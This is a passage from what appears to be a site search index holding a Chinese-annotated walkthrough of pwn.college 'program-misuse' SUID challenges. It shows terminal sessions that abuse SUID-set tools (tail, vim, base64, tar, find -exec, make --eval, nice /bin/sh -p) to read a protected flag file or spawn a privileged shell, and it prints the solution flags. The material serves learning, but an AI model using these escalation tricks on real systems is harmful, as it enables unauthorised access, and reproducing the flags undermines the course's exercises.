less\u6bd4more\u597d\u7528\uff0c\u8bb0\u5f97\u4f7f\u7528q\u9000\u51fa","title":"level3 Lets you directly read the flag!"},{"location":"en/CSE466/program-misuse/#level4-lets-you-directly-read-the-flag","text":"hacker@program-misuse-level-4:/challenge$ ./babysuid_level4 Welcome to ./babysuid_level4! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/tail. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level4) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/tail! hacker@program-misuse-level-4:/challenge$ \u7528 tail hacker@program-misuse-level-4:/challenge$ tail /flag pwn.college{8A8n6zzy-sUTn179ZADopx1lzFV.0lN0EDL2QjMyMzW} hacker@program-misuse-level-4:/challenge$ \u6211\u73b0\u5728\u731c\u4e0b\u4e00\u4e2a\u7528head","title":"level4 Lets you directly read the flag!"},{"location":"en/CSE466/program-misuse/#level5-lets-you-directly-read-the-flag","text":"hacker@program-misuse-level-5:~$ sh file.sh Welcome to ./babysuid_level5! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/head. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level5) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/head! hacker@program-misuse-level-5:~$ \u679c\u7136\u7528head hacker@program-misuse-level-5:~$ head /flag pwn.college{wVl3wFV0tMkY6rAFaMWKvEoOt2R.01N0EDL2QjMyMzW} hacker@program-misuse-level-5:~$","title":"level5 Lets you directly read the flag!"},{"location":"en/CSE466/program-misuse/#level6-lets-you-directly-read-the-flag","text":"hacker@program-misuse-level-6:~$ sh file.sh Welcome to ./babysuid_level6! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/sort. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level6) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/sort! hacker@program-misuse-level-6:~$ sort /flag pwn.college{wRB7HgX_kvB4Uro33D7t1UKWZcE.0FO0EDL2QjMyMzW} hacker@program-misuse-level-6:~$ \u8fd9\u6b21\u5c45\u7136\u662f\u7528sort \u8fd9\u91cc\u505a\u4e00\u4e2a\u5c0f\u603b\u7ed3\uff0c\u4ee5\u4e0a\u8fd9\u51e0\u4e2a\u5de5\u5177\u90fd\u975e\u5e38\u5e38\u7528\uff0c\u800c\u4e14\u7ecf\u5e38\u662f\u7ec4\u5408\u4f7f\u7528\u7684\uff0c\u5efa\u8bae\u4f7f\u7528 man \u9605\u8bfb\u624b\u518c\uff0c\u7136\u540e\u591a\u5c1d\u8bd5\u642d\u914d\u4f7f\u7528\u3002","title":"level6 Lets you directly read the flag!"},{"location":"en/CSE466/program-misuse/#level7-shows-you-that-an-over-privileged-editor-is-a-very-powerful-tool","text":"hacker@program-misuse-level-7:~$ sh file.sh Welcome to ./babysuid_level7! This challenge is part of a series of programs that shows you that an over-privileged editor is a very powerful tool, indeed. I just set the SUID bit on /usr/bin/vim. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level7) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/vim! hacker@program-misuse-level-7:~$ vim /flag \u4ece\u6807\u9898\u80fd\u770b\u51fa\u6765\u662f\u7528\u67d0\u79cd\u7f16\u8f91\u5de5\u5177\uff0c\u8fd9\u6b21\u662f vim pwn.college{YA-02bwpz2aH0bVuFckXnVUE_a8.0VO0EDL2QjMyMzW} \u6211\u731c\u540e\u8fb9\u513f\u5f97\u6709nano emacs\u7b49\u7b49","title":"level7 Shows you that an over-privileged editor is a very powerful tool!"},{"location":"en/CSE466/program-misuse/#level8-shows-you-that-an-over-privileged-editor-is-a-very-powerful-tool","text":"hacker@program-misuse-level-8:~$ sh file.sh Welcome to ./babysuid_level8! This challenge is part of a series of programs that shows you that an over-privileged editor is a very powerful tool, indeed. I just set the SUID bit on /usr/bin/emacs. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level8) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/emacs! \u679c\u7136\u4e0d\u51fa\u6211\u6240\u6599hhh pwn.college{sCKRHf2_yRVb3Q_MEPjyLzcoqdN.0FM1EDL2QjMyMzW} emacs\u4e5f\u662f\u4e00\u4e2a\u5f3a\u5927\u7684\u5de5\u5177\uff0c\u53ef\u4ee5\u5b66\u4e00\u5b66\u3002 \u8fd9\u91cc\u9000\u51fa\u547d\u4ee4\u662f","title":"level8 Shows you that an over-privileged editor is a very powerful tool!"},{"location":"en/CSE466/program-misuse/#level9-shows-you-that-an-over-privileged-editor-is-a-very-powerful-tool","text":"hacker@program-misuse-level-9:~$ sh file.sh Welcome to ./babysuid_level9! This challenge is part of a series of programs that shows you that an over-privileged editor is a very powerful tool, indeed. I just set the SUID bit on /usr/bin/nano. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level9) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/nano! hacker@program-misuse-level-9:~$ nano /flag \u6211\u679c\u7136\u6599\u4e8b\u5982\u795e pwn.college{w4DHxmYT2HQw-wrXkHpQXqNmIWW.0VM1EDL2QjMyMzW} \u9000\u51fa\u547d\u4ee4\u662f","title":"level9 Shows you that an over-privileged editor is a very powerful tool!"},{"location":"en/CSE466/program-misuse/#level10-requires-you-to-understand-their-output-to-derive-the-flag-from-it","text":"\u4e00\u53e5\u9898\u5916\u8bdd\uff0c\u4e0d\u540c\u6311\u6218\u4e4b\u95f4\u65e0\u7f1d\u5207\u6362\u597d\u5feb\u554a\uff0c\u5f88\u9002\u5408Linux\u76f4\u63a5\u7528terminal\u94fe\u63a5\uff01 hacker@program-misuse-level-10:~$ sh file.sh Welcome to ./babysuid_level10! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/rev. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level10) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/rev! rev \u662f\u53cd\u5e8f\u8f93\u51fa\u7684\u5de5\u5177 \u4f46\u662f\u96be\u4e0d\u4f4f\u6211 hacker@program-misuse-level-10:~$ rev /flag }WzMyMjQ2LDE1Ml0.iqRmReNkY5WaIyBZQULv-MYk7kI{egelloc.nwp hacker@program-misuse-level-10:~$ rev /flag | rev pwn.college{Ik7kYM-vLUQZByIaW5YkNeRmRqi.0lM1EDL2QjMyMzW} hacker@program-misuse-level-10:~$","title":"level10 Requires you to understand their output to derive the flag from it!"},{"location":"en/CSE466/program-misuse/#level11-requires-you-to-understand-their-output-to-derive-the-flag-from-it","text":"hacker@program-misuse-level-11:~$ sh file.sh Welcome to ./babysuid_level11! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/od. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level11) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/od! od \u901a\u5e38\u7528\u4e8e\u4ee5\u516b\u8fdb\u5236\u6216\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u6587\u4ef6\u7684\u5185\u5bb9\u3002 hacker@program-misuse-level-11:~$ od -A x -t x1z -v /flag 000000 70 77 6e 2e 63 6f 6c 6c 65 67 65 7b 73 4b 47 35 >pwn.college{sKG5< 000010 6d 6b 70 75 44 35 38 63 71 76 44 65 33 32 39 4e >mkpuD58cqvDe329N< 000020 57 6c 4f 36 31 41 39 2e 30 31 4d 31 45 44 4c 32 >WlO61A9.01M1EDL2< 000030 51 6a 4d 79 4d 7a 57 7d 0a >QjMyMzW}.< 000039 hacker@program-misuse-level-11:~$ \u770b\u4e86\u6587\u6863\u5c31\u4f1a\u4e86\uff0c\u8fd9\u4e2a\u547d\u4ee4\u76f4\u63a5\u5199\u5728\u6587\u6863\u91cc\u3002 pwn.college{sKG5mkpuD58cqvDe329NWlO61A9.01M1EDL2QjMyMzW}","title":"level11 Requires you to understand their output to derive the flag from it!"},{"location":"en/CSE466/program-misuse/#level12-requires-you-to-understand-their-output-to-derive-the-flag-from-it","text":"Welcome to ./babysuid_level12! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/hd. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level12) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/hd! \u5947\u602a\u7684 hd \u5de5\u5177\uff0c\u5341\u516d\u8fdb\u5236\u7684\u3002 hacker@program-misuse-level-12:~$ hd /flag 00000000 70 77 6e 2e 63 6f 6c 6c 65 67 65 7b 6f 47 7a 69 |pwn.college{oGzi| 00000010 37 55 30 32 58 54 6c 5f 64 73 6e 50 43 77 73 42 |7U02XTl_dsnPCwsB| 00000020 52 38 6d 59 54 77 6d 2e 30 46 4e 31 45 44 4c 32 |R8mYTwm.0FN1EDL2| 00000030 51 6a 4d 79 4d 7a 57 7d 0a |QjMyMzW}.| 00000039 hacker@program-misuse-level-12:~$ man hd \u8fd9\u91cc\u5df2\u7ecf\u53ef\u4ee5\u76f4\u63a5\u590d\u5236\u4e86\uff0c\u4f46\u662f\u5e0c\u671b\u6709\u66f4\u7b80\u4fbf\u7684\u5f62\u52bf\uff0c\u53bb\u770b\u4e86\u6587\u6863\uff0c\u4f46\u662f\u6ca1\u592a\u7814\u7a76\u660e\u767d\uff0c\u778e\u6574\u4e86\u4e00\u4e2a\u8f93\u51fa hacker@program-misuse-level-12:~$ hd -f /flag hd: \"pwn.college{oGzi7U02XTl_dsnPCwsBR8mYTwm.0FN1EDL2QjMyMzW}\": bad format hacker@program-misuse-level-12:~$","title":"level12 Requires you to understand their output to derive the flag from it!"},{"location":"en/CSE466/program-misuse/#level13-requires-you-to-understand-their-output-to-derive-the-flag-from-it","text":"Welcome to ./babysuid_level13! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/xxd. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level13) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/xxd! xxd \uff0c\u662f\u4e2a\u4e8c\u8fdb\u5236\u7684\u5de5\u5177\u3002\u8fd9\u4e2a\u6211\u4f1a hacker@program-misuse-level-13:~$ xxd /flag 00000000: 7077 6e2e 636f 6c6c 6567 657b 4d56 2d59 pwn.college{MV-Y 00000010: 6e5f 3465 4777 6c63 6f49 5438 4a63 574a n_4eGwlcoIT8JcWJ 00000020: 6934 7764 2d53 692e 3056 4e31 4544 4c32 i4wd-Si.0VN1EDL2 00000030: 516a 4d79 4d7a 577d 0a QjMyMzW}. \u7136\u540e\u624b\u52a8\u590d\u5236... pwn.college{MV-Yn_4eGwlcoIT8JcWJi4wd-Si.0VN1EDL2QjMyMzW}","title":"level13 Requires you to understand their output to derive the flag from it!"},{"location":"en/CSE466/program-misuse/#level14-requires-you-to-understand-their-output-to-derive-the-flag-from-it","text":"hacker@program-misuse-level-14:~$ sh file.sh Welcome to ./babysuid_level14! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/base32. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level14) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/base32! base32 \u90fd\u51fa\u6765\u4e86,\u5c31\u4e00\u4e2a\u53c2\u6570 -d hacker@program-misuse-level-14:~$ base32 /flag OB3W4LTDN5WGYZLHMV5UCT3NM4ZWGTLYK5YV6SCVOR2XC5CSMF4WM6LML5UWE4ZOGBWE4MKFIRGD EULKJV4U26SXPUFA==== hacker@program-misuse-level-14:~$ base32 /flag | base32 -d pwn.college{AOmg3cMxWq_HUtuqtRayfyl_ibs.0lN1EDL2QjMyMzW} hacker@program-misuse-level-14:~$ \u90a3\u6211\u731c\u4e0b\u4e00\u4e2a\u662fbase64","title":"level14 Requires you to understand their output to derive the flag from it!"},{"location":"en/CSE466/program-misuse/#level15-requires-you-to-understand-their-output-to-derive-the-flag-from-it","text":"hacker@program-misuse-level-15:~$ sh file.sh Welcome to ./babysuid_level15! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/base64. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level15) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/base64! hacker@program-misuse-level-15:~$ \u563f\u563f\uff0c\u679c\u7136 hacker@program-misuse-level-15:~$ base64 /flag | base64 -d pwn.college{QvvMGkZ_gpVBCBw1u5dYReqKajl.01N1EDL2QjMyMzW} hacker@program-misuse-level-15:~$","title":"level15 Requires you to understand their output to derive the flag from it!"},{"location":"en/CSE466/program-misuse/#level16-requires-you-to-understand-their-output-to-derive-the-flag-from-it","text":"hacker@program-misuse-level-16:~$ sh file.sh Welcome to ./babysuid_level16! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/split. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level16) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/split! split \u662f\u4e00\u4e2a\u5206\u5757\u7684\u5de5\u5177\uff0c\u4f46\u662f\u7531\u4e8e\u9898\u4e2d\u7684flag\u5f88\u5c0f\uff0c\u8fd8\u8fbe\u4e0d\u5230\u5b83\u9ed8\u8ba4\u7684\u9650\u5ea6\uff08\u9ed8\u8ba4\u53c2\u6570\u9700\u8981\u770b\u624b\u518c\uff09\uff0c\u56e0\u6b64\u5728\u8fd0\u884c split /flag \u4e4b\u540e\uff0c\u5c31\u4f1a\u5728\u6587\u4ef6\u5939\u4e4b\u4e0b\u6709\u4e2a\u8f93\u51fa\u6587\u4ef6\u3002 hacker@program-misuse-level-16:~$ cat xaa pwn.college{oqsgCLV3hcD9AXs5bELwauYQHup.0FO1EDL2QjMyMzW} \u5c0f\u603b\u7ed3\uff0c\u9664\u4e86\u6700\u8fd1\u57fa\u672c\u7684\u8fdb\u5236\u3001ascii\u7b49\uff0cbase32\u548cbase64\u6700\u597d\u53ef\u4ee5\u4e86\u89e3\u4e00\u4e0b\u8fd9\u4e24\u79cd\u7f16\u7801\u65b9\u5f0f","title":"level16 Requires you to understand their output to derive the flag from it!"},{"location":"en/CSE466/program-misuse/#level17-forces-you-to-understand-different-archive-formats","text":"hacker@program-misuse-level-17:~$ sh file.sh Welcome to ./babysuid_level17! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/gzip. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level17) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/gzip! \u725b\u9a6c\u7684 gzip \uff0c\u538b\u7f29\u548c\u89e3\u538b\u7f29\uff0c\u770b\u6765\u540e\u51e0\u4e2a\u90fd\u662f\u8fd9\u4e2a\u610f\u601d \u7136\u540e\u5f00\u59cb\u79d2\u9898 hacker@program-misuse-level-17:~$ gzip -f /flag -t hacker@program-misuse-level-17:~$ ls / bin challenge etc home lib32 libx32 mnt proc run srv tmp var boot dev flag.gz lib lib64 media opt root sbin sys usr hacker@program-misuse-level-17:~$ gzip -cd /flag.gz pwn.college{QHVq0GV7-f7QFzzNe2jTzkeq6T8.0VO1EDL2QjMyMzW} hacker@program-misuse-level-17:~$","title":"level17 Forces you to understand different archive formats!"},{"location":"en/CSE466/program-misuse/#level18-forces-you-to-understand-different-archive-formats","text":"\u5f00\u59cb\u65e0\u804a\u8d77\u6765\u4e86\u3002\u3002\u3002 hacker@program-misuse-level-18:~$ sh file.sh Welcome to ./babysuid_level18! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/bzip2. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level18) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/bzip2! \u7136\u540e\u548c\u4e0a\u9762\u7684\u547d\u4ee4\u5b8c\u5168\u4e00\u6837\uff0c\u5c31\u662f\u538b\u7f29\u7684\u683c\u5f0f\u548c\u7b97\u6cd5\u4e0d\u540c\u4e86 hacker@program-misuse-level-18:~$ bzip2 -f /flag hacker@program-misuse-level-18:~$ ls / bin challenge etc home lib32 libx32 mnt proc run srv tmp var boot dev flag.bz2 lib lib64 media opt root sbin sys usr hacker@program-misuse-level-18:~$ bzip2 -cd /flag.bz2 pwn.college{wkf3JjpEoyTnVUz5mUbAtllNMRn.0FM2EDL2QjMyMzW} hacker@program-misuse-level-18:~$","title":"level18 Forces you to understand different archive formats!"},{"location":"en/CSE466/program-misuse/#level19-forces-you-to-understand-different-archive-formats","text":"Welcome to ./babysuid_level19! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/zip. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level19) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/zip! \u8fd9\u51e0\u4e2a\u9898\u53ef\u6709\u70b9\u513f\u70e6\u4eba\u4e86\u554a\uff01 hacker@program-misuse-level-19:~$ cat /flag.zip PK V3199flagUT \ufffddBdux pwn.college{YFFLGakdSzjIgW7btl64EaiEyDf.0VM2EDL2QjMyMzW} PK V3199flagUT\ufffddux PKJwhacker@program-misuse-level-19:~$ \u6b63\u786e\u7684\u65b9\u5f0f\u5e94\u8be5\u662f\u5148\u89e3\u538b\uff0c\u4f46\u662f\u8c8c\u4f3c\u80fd\u76f4\u63a5\u770b\uff0c\u6211\u5c31\u6ca1\u7ba1","title":"level19 Forces you to understand different archive formats!"},{"location":"en/CSE466/program-misuse/#level20-forces-you-to-understand-different-archive-formats","text":"hacker@program-misuse-level-20:~$ sh file.sh Welcome to ./babysuid_level20! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/tar. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level20) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/tar! tar \u6bd4\u8f83\u5e38\u89c1\u3002 hacker@program-misuse-level-20:~$ tar cf /flag.tar /flag tar: Removing leading `/' from member names hacker@program-misuse-level-20:~$ ls / bin challenge etc flag.tar lib lib64 media opt root sbin sys usr boot dev flag home lib32 libx32 mnt proc run srv tmp var hacker@program-misuse-level-20:~$ cat /flag.tar flag0000400000000000000000000000007114456374677010423 0ustar rootrootpwn.college{YNojFHYmMjDXxa2MP_mFcpOEIIo.0lM2EDL2QjMyMzW} hacker@program-misuse-level-20:~$ \u597d\u50cf\u90fd\u53ef\u4ee5\u76f4\u63a5\u7528cat\u770b\u538b\u7f29\u5305\uff0c\u90a3\u4e48\u5c31\u6bd4\u8f83\u7b80\u5355\u4e86","title":"level20 Forces you to understand different archive formats!"},{"location":"en/CSE466/program-misuse/#level21-forces-you-to-understand-different-archive-formats","text":"hacker@program-misuse-level-21:~$ sh file.sh Welcome to ./babysuid_level21! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/ar. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level21) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/ar! ar \u5de5\u5177\uff0c\u96c6\u5408\u5f88\u591a\u6587\u6863\u5b58\u6210\u4e00\u4e2a\u6587\u6863\u7684\u5de5\u5177 hacker@program-misuse-level-21:~$ ar rs /flag.a /flag ar: creating /flag.a hacker@program-misuse-level-21:~$ cat /flag.a !<arch> flag/ 0 0 0 644 57 ` pwn.college{0vq28yii-jRYCSQP_DtM3bkf8ee.01M2EDL2QjMyMzW} hacker@program-misuse-level-21:~$","title":"level21 Forces you to understand different archive formats!"},{"location":"en/CSE466/program-misuse/#level22-forces-you-to-understand-different-archive-formats","text":"hacker@program-misuse-level-22:~$ sh file.sh Welcome to ./babysuid_level22! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/cpio. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level22) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/cpio! cpio \u5de5\u5177\uff0c\u7528\u4e8e\u6587\u4ef6\u5907\u4efd\u7684 hacker@program-misuse-level-22:~$ find /flag | cpio -ov > archive.cpio /flag 1 block hacker@program-misuse-level-22:~$ ls / bin challenge etc home lib32 libx32 mnt proc run srv tmp var boot dev flag lib lib64 media opt root sbin sys usr hacker@program-misuse-level-22:~$ ls Desktop Downloads Pictures Templates archive.cpio file.sh Documents Music Public Videos core test.py hacker@program-misuse-level-22:~$ cat archive.cpio \ufffdwd\ufffd9/flagpwn.college{om324dLj5vHeY7kTe9p_qAFQ1Cy.0FN2EDL2QjMyMzW} \ufffd TRAILER!!!hacker@program-misuse-level-22:~$","title":"level22 Forces you to understand different archive formats!"},{"location":"en/CSE466/program-misuse/#level23-forces-you-to-understand-different-archive-formats","text":"hacker@program-misuse-level-23:~$ sh file.sh Welcome to ./babysuid_level23! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/genisoimage. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level23) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/genisoimage! genisoimage \u5de5\u5177\uff0c\u80fd\u770b\u51fa\u6765\u4f5c\u7528\u662f\u5efa\u7acbISO 9660\u6620\u50cf\u6587\u4ef6 er@program-misuse-level-23:~$ genisoimage -sort /flag genisoimage: Incorrect sort file format pwn.college{YROFw7Q_KvLF86Vs3WeI_XDvziT.0VN2EDL2QjMyMzW} hacker@program-misuse-level-23:~$ \u8fd9\u5757\u513f\u597d\u50cfcat\u4e0d\u592a\u661f\u4e86\uff0c\u8f93\u51fa\u4f1a\u6253\u4e71shell \u5c0f\u603b\u7ed3\uff1a\u5012\u662f\u77e5\u9053\u4e86\u5f88\u591a\u4ee5\u524d\u4e0d\u77e5\u9053\u7684\u5de5\u5177\u3002","title":"level23 Forces you to understand different archive formats!"},{"location":"en/CSE466/program-misuse/#level24-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"sh hacker@program-misuse-level-24:~$ sh file.sh Welcome to ./babysuid_level24! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/env. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level24) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/env! \u5f00\u59cb\u6709\u610f\u601d\u8d77\u6765\u4e86\u3002 hacker@program-misuse-level-24:~$ env cat /flag pwn.college{8rPxiO1f2sBGHUvcT83glFWNSpM.0lN2EDL2QjMyMzW} hacker@program-misuse-level-24:~$ env\u53ef\u4ee5\u7ed9\u5176\u4ed6\u7684\u7a0b\u5e8f\u8d4b\u6743\uff1f\u611f\u89c9\u662f\u8fd9\u4e2a\u610f\u601d\uff0c\u5f53\u7136\u51fa\u9898\u4eba\u60f3\u8981\u7684\u610f\u601d\u5e94\u8be5\u662f\u9700\u8981\u5148\u8bbe\u4e00\u4e2ashell\uff0c\u7136\u540e\u6267\u884c\u3002","title":"level24 Enables you to read flags by making them execute other commands!"},{"location":"en/CSE466/program-misuse/#level25-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"hacker@program-misuse-level-25:~$ sh file.sh Welcome to ./babysuid_level25! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/find. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level25) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/find! \u4f7f\u7528find hacker@program-misuse-level-25:~$ find / -type f -name \"flag\" -exec cat {} \\; pwn.college{Uomlfru_u94ZuszsvlNzA0n6x39.01N2EDL2QjMyMzW} hacker@program-misuse-level-25:~$ \u8fd9\u91cc\u9700\u8981\u8003\u8651\u7684\u662ffind\u53ea\u662f\u627e\u5230\uff0c\u5982\u4f55\u8bfb\u53d6\uff1f \u4f7f\u7528 -exec","title":"level25 Enables you to read flags by making them execute other commands!"},{"location":"en/CSE466/program-misuse/#level26-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"hacker@program-misuse-level-26:~$ sh file.sh Welcome to ./babysuid_level26! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/make. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level26) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/make! \u6709\u70b9\u513f\u610f\u601d\u554a\uff0c\u76f4\u63a5\u51fa\u73b0\u4e86GNU Make\u4e86 hacker@program-misuse-level-26:~$ COMMAND='cat /flag';make -s --eval=$'x:\\n\\t-'\"$COMMAND\" pwn.college{oYDGLL2PogQjUYR2TV30VTUm-4z.0FO2EDL2QjMyMzW} hacker@program-misuse-level-26:~$ \u8fd9\u4e2a\u641c\u4e86\u4e00\u4e0b\uff0c\u7136\u540e\u4e0d\u5149\u67e5\u5230\u4e86\u6b63\u786e\u7b54\u6848\u8fd8\u53d1\u73b0\u81ea\u5df1\u505a\u9519\u4e86\uff0c\u51fa\u9898\u4eba\u60f3\u8981\u7684\u662f sh -p \u8fd9\u6837\u63d0\u6743 \u8fd9\u4e2a\u547d\u4ee4\u7684\u4f5c\u7528\u662f\u542f\u52a8\u4e00\u4e2a\u65b0\u7684shell\u8fdb\u7a0b\uff0c\u5e76\u5c06\u8be5\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u5f53\u524dshell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u3002 \u5177\u4f53\u6765\u8bf4\uff0c\u8fd9\u4e2a\u547d\u4ee4\u5305\u542b\u4ee5\u4e0b\u90e8\u5206\uff1a env\uff1a\u8fd9\u662f\u4e00\u4e2a\u7528\u4e8e\u6267\u884c\u547d\u4ee4\u65f6\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u7684\u5de5\u5177\u3002\u5728\u8fd9\u4e2a\u547d\u4ee4\u4e2d\uff0c\u5b83\u7528\u4e8e\u5c06\u5f53\u524dshell\u8fdb\u7a0b\u7684\u6240\u6709\u73af\u5883\u53d8\u91cf\u4f20\u9012\u7ed9\u65b0\u7684shell\u8fdb\u7a0b\u3002 sh\uff1a\u8fd9\u662f\u4e00\u4e2a\u7528\u4e8e\u542f\u52a8shell\u8fdb\u7a0b\u7684\u547d\u4ee4\u3002\u5728\u8fd9\u4e2a\u547d\u4ee4\u4e2d\uff0c\u5b83\u7528\u4e8e\u542f\u52a8\u4e00\u4e2a\u65b0\u7684shell\u8fdb\u7a0b\u3002 -p\uff1a\u8fd9\u662f\u4e00\u4e2a\u9009\u9879\uff0c\u7528\u4e8e\u544a\u8bc9\u65b0\u7684shell\u8fdb\u7a0b\u5c06\u5176\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u5f53\u524dshell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5b83\u4f1a\u5c06\u5f53\u524dshell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u4ece\u73af\u5883\u53d8\u91cf\u6587\u4ef6\uff08\u5982/etc/environment\u3001/etc/profile\u3001~/.bashrc\u7b49\uff09\u4e2d\u8bfb\u53d6\uff0c\u5e76\u5c06\u5176\u8bbe\u7f6e\u4e3a\u65b0\u7684shell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u3002 \u56e0\u6b64\uff0c\u8fd9\u4e2a\u547d\u4ee4\u7684\u6548\u679c\u662f\u542f\u52a8\u4e00\u4e2a\u65b0\u7684shell\u8fdb\u7a0b\uff0c\u5e76\u5c06\u5176\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u5f53\u524dshell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u3002\u8fd9\u53ef\u4ee5\u7528\u4e8e\u6d4b\u8bd5shell\u811a\u672c\u6216\u547d\u4ee4\u5bf9\u73af\u5883\u53d8\u91cf\u7684\u5f71\u54cd\uff0c\u6216\u8005\u5728\u4e24\u4e2a\u4e0d\u540c\u7684shell\u8fdb\u7a0b\u4e4b\u95f4\u5171\u4eab\u73af\u5883\u53d8\u91cf\u3002 \u770b\u8d77\u6765\u5c31\u662f\u8d4b\u6743\uff0c\u7136\u540e\u4f1a\u62ff\u5230\u4e00\u4e2a\u65b0\u7684shell\u63d0\u793a\u7b26","title":"level26 Enables you to read flags by making them execute other commands!"},{"location":"en/CSE466/program-misuse/#level27-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"hacker@program-misuse-level-27:~$ sh file.sh Welcome to ./babysuid_level27! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/nice. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level27) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/nice! nice \u5de5\u5177:\u7528\u4e8e\u4ee5\u6307\u5b9a\u7684\u8fdb\u7a0b\u8c03\u5ea6\u4f18\u5148\u7ea7\u542f\u52a8\u5176\u4ed6\u7684\u7a0b\u5e8f\u3002 hacker@program-misuse-level-27:~$ nice /bin/sh -p # cat /flag pwn.college{celMGA3nJomrVQwA5iPwIY2IORz.0VO2EDL2QjMyMzW} # \u8fd9\u6837\u624d\u662f\u9898\u76ee\u60f3\u8981\u7684\uff0c\u6211\u50bb\u4e86","title":"level27 Enables you to read flags by making them execute other commands!"},{"location":"en/CSE466/program-misuse/#level28-enables-you-to-read-flags-by-making-them-execute-other-commands","text":"hacker@program-misuse-level-28:~$ sh file.sh Welcome to ./babysuid_level28! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/timeout. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level28) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/timeout! timeout 